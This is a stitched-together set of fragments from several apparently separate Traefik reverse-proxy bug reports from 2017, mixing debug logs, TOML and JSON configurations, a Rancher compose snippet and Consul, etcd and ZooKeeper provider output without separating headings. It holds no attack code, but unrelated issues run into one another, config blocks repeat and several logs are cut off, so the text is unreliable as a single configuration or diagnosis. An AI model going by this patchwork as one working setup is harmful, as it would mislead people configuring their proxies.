### if applicable, please paste the log output in debug mode (`--debug` switch) special debug version from @juliens:
[traefik-1]2017-09-27t21:37:26.468005624z time="2017-09-27t21:37:26z" level=debug msg="look for provided certificate to validate [streaming.example.com]..." [traefik-1]2017-09-27t21:37:26.468190338z time="2017-09-27t21:37:26z" level=debug msg="no provided certificate found for domains [streaming.example.com], get acme certificate." [traefik-1]2017-09-27t21:37:26.468236280z time="2017-09-27t21:37:26z" level=debug msg="challenge getcertificate streaming.example.com" [traefik-1]2017-09-27t21:37:26.468302456z time="2017-09-27t21:37:26z" level=debug msg="acme got domain cert streaming.example.com" [traefik-1]2017-09-27t21:37:26.915226282z time="2017-09-27t21:37:26z" level=debug msg="try dialing `streaming-api.backend-dev:7788`" [traefik-1]2017-09-27t21:37:26.915263389z time="2017-09-27t21:37:26z" level=warning msg="error dialing `streaming-api.backend-dev:7788`: websocket: bad handshake with resp: &{401 unauthorized 401 http/1.1 1 1 map[www-authenticate:[basic realm=""] server:[akka-http/2.3.16] date:[wed, 27 sep 2017 21:37:26 gmt] content-type:[text/plain; charset=utf-8] content-length:[77]] { } 77 [] false false map[] <nil>}" [traefik-1]2017-09-27t21:37:32.116914266z time="2017-09-27t21:37:32z" level=debug msg="look for provided certificate to validate [streaming.example.com]..." [traefik-1]2017-09-27t21:37:32.116944842z time="2017-09-27t21:37:32z" level=debug msg="no provided certificate found for domains [streaming.example.com], get acme certificate." [traefik-1]2017-09-27t21:37:32.116974729z time="2017-09-27t21:37:32z" level=debug msg="challenge getcertificate streaming.example.com" [traefik-1]2017-09-27t21:37:32.117612246z time="2017-09-27t21:37:32z" level=debug msg="acme got domain cert streaming.example.com" [traefik-1]2017-09-27t21:37:32.261379578z time="2017-09-27t21:37:32z" level=debug msg="try dialing `streaming-api.backend-dev:7788`" [traefik-1]2017-09-27t21:37:32.261446671z time="2017-09-27t21:37:32z" level=warning msg="error dialing `streaming-api.backend-dev:7788`: websocket: bad handshake with resp: &{401 unauthorized 401 http/1.1 1 1 map[content-type:[text/plain; charset=utf-8] content-length:[77] www-authenticate:[basic realm=""] server:[akka-http/2.3.16] date:[wed, 27 sep 2017 21:37:31 gmt]] { } 77 [] false false map[] <nil>}" ```
loglevel = "debug" defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [consul] endpoint = "192.168.100.10:8500" watch = true prefix = "traefik" [web] address = ":8080" [consulcatalog] endpoint = "192.168.100.10:8500" domain = "mydomain.com" prefix = "traefik" watch = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-09-21t08:33:07z" level=debug msg="catalog services change detected." discoveredservices=[traefik-ui consul consul-8300 consul-8301 cadvisor node-exporter consul-8302 traefik-80 consul-8500]
my new service (prometheus) is not found.
{ "gracetimeout": 10000000000, "debug": true, "checknewversion": true, "accesslogsfile": "/var/log/traefik/access.log", "accesslog": null, "traefiklogsfile": "/var/log/traefik/traefik.log", "loglevel": "debug", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": { "readtimeout": 0, "writetimeout": 0, "idletimeout": 180000000000 }, "forwardingtimeouts": { "dialtimeout": 30000000000, "responseheadertimeout": 0 }, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": { "watch": false, "filename": "", "constraints": [], "trace": false, "debugloggeneratedtemplate": false, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "service.consul", "exposedbydefault": true, "prefix": "traefik", "frontendrule": "host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}" }, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/etc/traefik/traefik.toml"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-09-20t06:02:25z" level=info msg="traefik version v1.4.0-rc3 built on 2017-09-18_04:38:27pm" time="2017-09-20t06:02:25z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"/var/log/traefik/access.log","accesslog":null,"traefiklogsfile":"/var/log/traefik/traefik.log","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":{"readtimeout":0,"writetimeout":0,"idletimeout":180000000000},"forwardingtimeouts":{"dialtimeout":30000000000,"responseheadertimeout":0},"docker":null,"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null,"debug":false,"currentconfigurations":null,"stats":null,"statsrecorder":null},"marathon":null,"consul":null,"consulcatalog":{"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"127.0.0.1:8500","domain":"service.consul","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}"},"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}" time="2017-09-20t06:02:25z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:false} with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2017-09-20t06:02:25z" level=info msg="starting provider *web.provider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null,"debug":true,"currentconfigurations":{},"stats":{"uptime":"2017-09-20t06:02:25.334560908z","pid":1416,"responsecounts":{},"totalresponsecounts":{},"totalresponsetime":"0001-01-01t00:00:00z"},"statsrecorder":null}" time="2017-09-20t06:02:25z" level=info msg="starting provider *consul.catalogprovider {"watch":false,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"endpoint":"127.0.0.1:8500","domain":"service.consul","exposedbydefault":true,"prefix":"traefik","frontendrule":"host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}"}" time="2017-09-20t06:02:25z" level=info msg="starting server on :80" time="2017-09-20t06:02:25z" level=error msg="failed to retrieve health checks" error="unexpected response code: 500 (no known consul servers)" time="2017-09-20t06:02:25z" level=error msg="failed to list services: unexpected response code: 500 (no known consul servers)" time="2017-09-20t06:02:55z" level=warning msg="error checking new version: get dial tcp 104.27.184.74:443: i/o timeout" ```
###############################################################################
## entry points
defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/xxxx.io.crt" keyfile = "/etc/ssl/xxxx.io.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/yyyy.ski.crt" keyfile = "/etc/ssl/yyyy.ski.key" [web] # web administration port
address = ":8080" # set rest api to read-only mode
readonly = true # authentication
#
[web.auth.digest]
users = [ "xxxx:traefik:xxxxx"
] [docker] # docker server endpoint
can be a tcp or a unix socket endpoint.
endpoint = "unix:///var/run/docker.sock" # default domain used.
# can be overridden by setting the "traefik.domain" label on a container.
domain = "xxxx.io" # enable watch docker changes
watch = true # expose containers by default in traefik
# if set to false, containers that don't have `traefik.enable=true` will be ignored
exposedbydefault = false # use swarm mode services as data provider
swarmmode = true [healthcheck] # set the default health check interval
will only be effective if health check
# paths are defined
given provider-specific support, the value may be
# overridden on a per-backend basis.
# can be provided in a format supported by [time.parseduration]( #parseduration) or as raw
# values (digits)
if no units are provided, the value is parsed assuming
interval = "15s" [accesslog]
``` ### extra everything is working when `traefik.backend.loadbalancer.swarm` is set to false.
###############################################################################
## entry points
defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/xxxx.io.crt" keyfile = "/etc/ssl/xxxx.io.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/yyyy.ski.crt" keyfile = "/etc/ssl/yyyy.ski.key" ###############################################################################
## web administration port
[web] # web administration port
address = ":8080" # set rest api to read-only mode
readonly = true # authentication
#
[web.auth.digest]
users = [ "xxxx:traefik:xxxxx"
] ###############################################################################
## docker configuration backend
[docker] # docker server endpoint
can be a tcp or a unix socket endpoint.
endpoint = "unix:///var/run/docker.sock" # default domain used.
# can be overridden by setting the "traefik.domain" label on a container.
domain = "xxxx.io" # enable watch docker changes
watch = true # expose containers by default in traefik
# if set to false, containers that don't have `traefik.enable=true` will be ignored
exposedbydefault = false # use swarm mode services as data provider
swarmmode = true ###############################################################################
## custom health check options
[healthcheck] # set the default health check interval
will only be effective if health check
# paths are defined
given provider-specific support, the value may be
# overridden on a per-backend basis.
# can be provided in a format supported by [time.parseduration]( #parseduration) or as raw
# values (digits)
if no units are provided, the value is parsed assuming
interval = "15s" ###############################################################################
## access log
[accesslog]
none: see setup above
using the community catalogue for rancher : note that features such as ssl cert setup, is not used
traefik is behind an ssl loadbalancer with a wildcard certificate.
################################################################
# global configuration
################################################################ loglevel = "debug" defaultentrypoints = ["http"] maxidleconnsperhost = 200 # default: 200 idletimeout = "180s" # default: 180s insecureskipverify = true # default false [healthcheck]
interval = "30s" # defautl 30s ################################################################
# entrypoints
################################################################ [entrypoints] [entrypoints.http] address = ":8081" ################################################################
# api backend
################################################################ [web] address = ":8080" ################################################################
# consul kv backend
################################################################ [consul]
endpoint = "consul.***:8500"
watch = true
prefix = "traefik"
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/loadbalancer/method key not found in store, setting default debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:18-05:00] cannot get key traefik/backends/na-nginx-lab/loadbalancer/method key not found in store, setting default warn[2017-09-11t15:31:18-05:00] error checking new version: malformed version: d54417acfe2be53021c60576e645964dc2d3a236 debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/na-nginx-lab/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/na-nginx-lab/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/na-nginx-lab/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/na-nginx-lab/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/na-nginx-lab/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/traveler-risk-management-beta/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/traveler-risk-management-beta/loadbalancer/method key not found in store, setting default debu[2017-09-11t15:31:19-05:00] cannot get key traefik/backends/traveler-risk-management-beta/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/loadbalancer/method key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-beta/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:20-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/loadbalancer/method key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/circuitbreaker/expression key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/loadbalancer/method key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/loadbalancer/sticky key not found in store, setting default false debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/healthcheck/path key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/frontends/na-nginx/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/maxconn/amount key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/backends/traveler-risk-management-service-beta/maxconn/extractorfunc key not found in store, setting default debu[2017-09-11t15:31:21-05:00] cannot get key traefik/frontends/na-nginx/passhostheader key not found in store, setting default true debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/na-nginx/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/travel-risk-management-service/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/na-nginx/passhostheader key not found in store, setting default true debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/travel-risk-management-service/passhostheader key not found in store, setting default true debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/travel-risk-management-service/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/travel-risk-management/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:22-05:00] cannot get key traefik/frontends/travel-risk-management-service/passhostheader key not found in store, setting default true debu[2017-09-11t15:31:23-05:00] cannot get key traefik/frontends/travel-risk-management/passhostheader key not found in store, setting default true debu[2017-09-11t15:31:23-05:00] cannot get key traefik/frontends/travel-risk-management/entrypoints key not found in store, setting default empty debu[2017-09-11t15:31:23-05:00] validation of load balancer method for backend na-nginx-lab failed: invalid load-balancing method ''
using default method wrr
rancher version 1.4.3
traefik: ports: - 8000:8080/tcp - 80:80/tcp - 443:443/tcp image: traefik:1.4.0-rc2-alpine command: - "--web" - "--entrypoints=name:http\\ address::80\\ redirect.entrypoint:https" - "--entrypoints=name:https\\ address::443\\ tls" - "--defaultentrypoints=http,https" - "--rancher" - "--rancher.domain=${rancher_domain}" - "--rancher.endpoint=${rancher_endpoint}" - "--rancher.accesskey=${rancher_accesskey}" - "--rancher.secretkey=${rancher_secretkey}" - "--rancher.exposedbydefault=false" - "--acme" - "--acme.email=${acme_email}" - "--acme.storage=/mnt/acme.json" - "--acme.entrypoint=https" - "--acme.ondemand=true" - "--loglevel=info" volumes: - "traefik_acme:/mnt:nocopy" volume_driver: ${volume_driver} ```
```toml [frontends] [frontends.toto] backend = "toto-services" [frontends.toto.routes.test_1] rule = "host:test.toto" [frontends.toto.routes.test_2] rule = "pathprefix:/toto-services/path/private" [backends] [backends.toto-services] [backends.toto-services.healthcheck] path = "/toto-services/path/health/" interval = "10s" port = 6667 [backends.toto-services.servers.server1] url = " " weight = 1 [backends.toto-services.servers.server2] url = " " weight = 1
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) /var/log/traefik/traefik.log ```
"healthcheck":{"path":"/toto-services/path/healthcheck","interval":"10s"}}
port is missing
docker swarm with traefik routing to swarm services from the outside
[backends] [backends.static] [backends.static.servers.server1] url = " " [backends.backend] [backends.backend.servers.server1] url = " " [frontends] [frontends.backend] backend = "backend" priority = 5 [frontends.backend.routes.new] rule = "pathprefix:/api,/wss" [frontends.static] backend = "static" priority = 1 [frontends.static.routes.new] rule = "pathprefix:/"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) when upgraded to 1.3.6 stopped seeing the following which i presume is a successful handshake:
level=debug msg="writing outgoing websocket request to target connection: &{method:get url:ws:/wss proto:http/1.1 protomajor:1 protominor:1 header:map[user-agent:[go-http-client/1.1] connection:[upgrade] sec-websocket-key:[key_here==] sec-websocket-version:[13] upgrade:[websocket] x-device-token:[token_here]] body:{} getbody:<nil> contentlength:0 transferencoding:[] close:false host:host.cloud form:map[] postform:map[] multipartform:<nil> trailer:map[] remoteaddr:84.1.1.22:34992 requesturi:/wss tls: cancel:<nil> response:<nil> ctx: }"
``` seeing lots of these in both versions:
server.go:2753: http: tls handshake error from 18.6.6.152:39254: read tcp 172.18.0.3:443->18.6.6.152:39254: read: connection reset by peer
server.go:2753: http: tls handshake error from 18.6.6.152:39272: eof
traefiklogsfile = "/var/log/traefik/traefik.log"
accesslogsfile = "/var/log/traefik/access.log"
loglevel = "debug" [consulcatalog] endpoint = "127.0.0.1:8500" domain = "service.consul" frontendrule = "host:{{servicename}}.{{domain}},pathprefixstrip:/{{servicename}}" prefix = "traefik"
################################################################
# common configuration
################################################################
loglevel="debug"
address = ":8080"
providersthrottleduration = 100000000 ################################################################
# web configuration backend
#################################################################
#defaultentrypoints = ["http"]
#[entrypoints]
# [entrypoints.http]
# address = ":80"
# [entrypoints.https]
# address = ":443" ################################################################
# docker configuration backend
################################################################
domain = "docker.local"
watch = true
exposedbydefault = false ################################################################
################################################################
endpoint = "192.168.196.88:12379"
watch = true
prefix = "traefik" #[zookeeper]
#endpoint = "172.31.32.250:12181"
#watch = true
#prefix = "traefik" #[file]
#watch = true
#filename = "rules.toml"
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
[root@centos7 traefik]# ./traefik --configfile=conf.toml
info[2017-09-06t14:44:17+08:00] traefik version v1.3.7 built on 2017-08-25_08:56:06pm info[2017-09-06t14:44:17+08:00] using toml configuration file conf.toml debu[2017-09-06t14:44:17+08:00] global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":{"node":"7d88f14e-5d8d-4083-a314-3ece276536cd","store":{"store":{},"prefix":"traefik"}},"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":1000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":{"watch":true,"filename":"","constraints":null,"endpoint":"unix:///var/run/docker.sock","domain":"docker.local","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false},"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":{"watch":true,"filename":"","constraints":[],"endpoint":"192.168.196.88:12379","prefix":"traefik","tls":null,"username":"","password":""},"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null} info[2017-09-06t14:44:17+08:00] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false} info[2017-09-06t14:44:17+08:00] starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"endpoint":"unix:///var/run/docker.sock","domain":"docker.local","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false} info[2017-09-06t14:44:17+08:00] starting provider *server.webprovider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null} info[2017-09-06t14:44:17+08:00] starting provider *etcd.provider {"watch":true,"filename":"","constraints":[],"endpoint":"192.168.196.88:12379","prefix":"traefik","tls":null,"username":"","password":""} info[2017-09-06t14:44:17+08:00] starting server on :80 debu[2017-09-06t14:44:17+08:00] node 7d88f14e-5d8d-4083-a314-3ece276536cd running for election info[2017-09-06t14:44:17+08:00] node 7d88f14e-5d8d-4083-a314-3ece276536cd elected slave debu[2017-09-06t14:44:17+08:00] provider connection established with docker 17.05.0-ce (api 1.29) info[2017-09-06t14:44:17+08:00] node 7d88f14e-5d8d-4083-a314-3ece276536cd elected leader debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_9 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_8 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_4 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_10 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_6 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_7 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_3 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_2 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_5 debu[2017-09-06t14:44:17+08:00] filtering disabled container /simpleweb_server_1 debu[2017-09-06t14:44:17+08:00] filtering container without port and no traefik.port label /registrator debu[2017-09-06t14:44:17+08:00] configuration received from provider docker: {} debu[2017-09-06t14:44:17+08:00] last docker config received more than 1s, ok info[2017-09-06t14:44:17+08:00] server configuration reloaded on :80 debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/backends//servers/ key not found in store debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/backends//servers/ key not found in store debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/method key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/method key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/amount key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/amount key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//entrypoints key not found in store, setting default empty debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//entrypoints key not found in store, setting default empty debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//backend key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//backend key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//passhostheader key not found in store, setting default true debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//passhostheader key not found in store, setting default true debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//priority key not found in store, setting default 0 debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//priority key not found in store, setting default 0 debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/frontends//routes/ key not found in store debu[2017-09-06t14:44:17+08:00] configuration received from provider etcd: {} debu[2017-09-06t14:44:17+08:00] last etcd config received less than 1s, waiting..
debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/frontends//routes/ key not found in store debu[2017-09-06t14:44:17+08:00] configuration received from provider etcd: {} debu[2017-09-06t14:44:17+08:00] last etcd config received less than 1s, waiting..
debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/backends//servers/ key not found in store debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/method key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/amount key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/backends//maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//entrypoints key not found in store, setting default empty debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//backend key not found in store, setting default debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//passhostheader key not found in store, setting default true debu[2017-09-06t14:44:17+08:00] cannot get key traefik/frontends//priority key not found in store, setting default 0 debu[2017-09-06t14:44:17+08:00] cannot get keys traefik/frontends//routes/ key not found in store debu[2017-09-06t14:44:17+08:00] configuration received from provider etcd: {} debu[2017-09-06t14:44:17+08:00] last etcd config received less than 1s, waiting..
debu[2017-09-06t14:44:18+08:00] waited for etcd config, ok info[2017-09-06t14:44:18+08:00] server configuration reloaded on :80 debu[2017-09-06t14:44:24+08:00] cannot get keys traefik/backends//servers/ key not found in store debu[2017-09-06t14:44:24+08:00] cannot get key traefik/backends//circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:44:24+08:00] cannot get key traefik/backends//loadbalancer/method key not found in store, setting default debu[2017-09-06t14:44:24+08:00] cannot get key traefik/backends//loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:44:24+08:00] cannot get key traefik/backends//maxconn/amount key not found in store, setting default debu[2017-09-06t14:44:24+08:00] cannot get key traefik/backends//maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:44:24+08:00] cannot get key traefik/frontends//entrypoints key not found in store, setting default empty debu[2017-09-06t14:44:24+08:00] cannot get key traefik/frontends//backend key not found in store, setting default debu[2017-09-06t14:44:24+08:00] cannot get key traefik/frontends//passhostheader key not found in store, setting default true debu[2017-09-06t14:44:24+08:00] cannot get key traefik/frontends//priority key not found in store, setting default 0 debu[2017-09-06t14:44:24+08:00] cannot get keys traefik/frontends//routes/ key not found in store debu[2017-09-06t14:44:24+08:00] configuration received from provider etcd: {} info[2017-09-06t14:44:24+08:00] skipping same configuration for provider etcd debu[2017-09-06t14:44:30+08:00] cannot get keys traefik/backends//servers/ key not found in store debu[2017-09-06t14:44:30+08:00] cannot get key traefik/backends//circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:44:30+08:00] cannot get key traefik/backends//loadbalancer/method key not found in store, setting default debu[2017-09-06t14:44:30+08:00] cannot get key traefik/backends//loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:44:30+08:00] cannot get key traefik/backends//maxconn/amount key not found in store, setting default debu[2017-09-06t14:44:30+08:00] cannot get key traefik/backends//maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:44:30+08:00] cannot get key traefik/frontends//entrypoints key not found in store, setting default empty debu[2017-09-06t14:44:30+08:00] cannot get key traefik/frontends//backend key not found in store, setting default debu[2017-09-06t14:44:30+08:00] cannot get key traefik/frontends//passhostheader key not found in store, setting default true debu[2017-09-06t14:44:30+08:00] cannot get key traefik/frontends//priority key not found in store, setting default 0 debu[2017-09-06t14:44:30+08:00] cannot get keys traefik/frontends//routes/ key not found in store debu[2017-09-06t14:44:30+08:00] configuration received from provider etcd: {} info[2017-09-06t14:44:30+08:00] skipping same configuration for provider etcd
``` #### etcd configure screenshot as below.
![issue2](
![issue3](
################################################################
# web configuration backend
#################################################################
#defaultentrypoints = ["http"]
#[entrypoints]
# [entrypoints.http]
# address = ":80"
# [entrypoints.https]
# address = ":443" ################################################################
# docker configuration backend
################################################################
domain = "docker.local"
watch = true
exposedbydefault = false ################################################################
################################################################
#endpoint = "192.168.196.88:12379"
#watch = true
#prefix = "traefik" [zookeeper]
endpoint = "172.31.32.250:12181"
watch = true
prefix = "traefik" #[file]
#watch = true
#filename = "rules.toml"
### if applicable, please paste the log output in debug mode (`--debug` switch) <details>
<summary>traefik debug log.</summary> ```
[root@centos7 traefik]# ./traefik --configfile=conf.toml
2017/09/06 14:21:25 connected to 172.31.32.250:12181
2017/09/06 14:21:25 authenticated: id=98004296028783520, timeout=30000
2017/09/06 14:21:25 re-submitting `0` credentials after reconnect
